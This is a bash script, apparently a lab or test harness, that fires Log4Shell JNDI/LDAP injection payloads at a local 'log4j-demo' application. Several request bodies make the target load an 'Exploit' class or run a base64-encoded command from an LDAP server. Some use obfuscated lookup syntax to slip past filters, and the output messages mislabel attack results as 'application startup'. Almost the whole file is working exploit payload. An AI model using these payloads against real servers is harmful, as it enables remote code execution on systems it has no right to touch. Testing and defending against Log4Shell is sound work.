#!/bin/bash
NONE='\033[00m'
GREEN='\033[01;32m'
RED='\033[01;31m'
BLUE='\033[0;34m'
for ((i=1;i<=30;i++));
do
   response=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/log4j-demo/)
   if [[ $response -eq 200 ]]; then
     echo  -e "${BLUE}Application started ${NONE} \n"
     break
   fi
   echo -e "${BLUE}Waiting for Application to start...${NONE}"
   sleep 10
done

APPLICATION_IP=localhost
APPLICATION_PORT=8080
ATTACKER_IP=127.0.0.1
ATTACKER_PORT=80


echo "" > /tmp/attack_output

ldap_ip=$(hostname -i)
ldap_port=1389
attack_payload=jndi:ldap://"${ldap_ip}":"${ldap_port}"/Exploit

#$ Curl1 data=jndi:ldap://"${ldap_ip}":"${ldap_port}"/Exploit Attack SSRF
curlList='curl --location --request POST -sw '"'"'%{http_code}'"'"' '"'"'localhost:8080/log4j-demo/log4j'"'"' --header '"'"'Content-Type: application/x-www-form-urlencoded'"'"' --data-urlencode '"'"'data=${'
curlList+="${attack_payload}"
curlList+='}'"'"''
echo "Starting curl execution....."
while read -r line;
do
  echo -e "${GREEN}Step 3: LAUNCHING THE ATTACK! ${NONE}"
  echo -e "${GREEN}Firing curl request to execute reverse shell attack ${NONE}"

  echo -e "${BLUE}Request Sent:${NONE} $line"
    res=$(/bin/bash -c "$line")
    #echo $res
    echo -e "${BLUE}Response Received:${NONE}\n$res "
    # echo -e "${GREEN}Step 3: Validating Attack.... ${NONE}"
    http_code="${res:${#res}-3}"
    if [[ $http_code -eq 200 ]]; then
        if [[ $res == *'200'* ]]; then
         echo -e "${GREEN}Step 4: APPLICATION STARTUP SUCCESSFUL!!! \n${NONE}"
      else
         echo -e "${RED}Step 4: APPLICATION STARTUP FAILED!!! ${NONE}"
        fi
   else
      echo -e "${RED}Step 4: APPLICATION STARTUP FAILED!!! ${NONE}"
   fi
done <<< "$curlList"
#^End


if [[ ( $1 == "all" ) ]]; then

  #$ Curl2 input=jndi:ldap://"${ldap_ip}":"${ldap_port}"/ Attack SSRF
  curl --location --request POST -sw '%{http_code}' 'localhost:8080/log4j-demo/log4j' --header 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'data=${jndi:ldap://'"${ldap_ip}":"${ldap_port}"'/}'
  #^End

  #$ Curl3 input=jndi:ldap://"${ldap_ip}":"${ldap_port}"/Basic/Command/Base64/L2Jpbi90b3VjaCBhYg== Attack SSRF
  curl --location --request POST -sw '%{http_code}' 'localhost:8080/log4j-demo/log4j' --header 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'data=${jndi:ldap://'"${ldap_ip}":"${ldap_port}"'/Basic/Command/Base64/L2Jpbi90b3VjaCBhYg==}'
  #^End

  #$ Curl3 input=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://"${ldap_ip}":"${ldap_port}"/Basic/Command/Base64/L2Jpbi90b3VjaCBhYg== Attack SSRF
  curl --location --request POST -sw '%{http_code}' 'localhost:8080/log4j-demo/log4j' --header 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'data=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://'"${ldap_ip}":"${ldap_port}"'/Basic/Command/Base64/L2Jpbi90b3VjaCBhYg==}'
  #^End

  #$ Curl4 input=${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//"${ldap_ip}":"${ldap_port}"/Exploit} Attack SSRF
  curl --location --request POST -sw '%{http_code}' 'localhost:8080/log4j-demo/log4j' --header 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'data=${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//'"${ldap_ip}":"${ldap_port}"'/Exploit}'
  #^End

fi
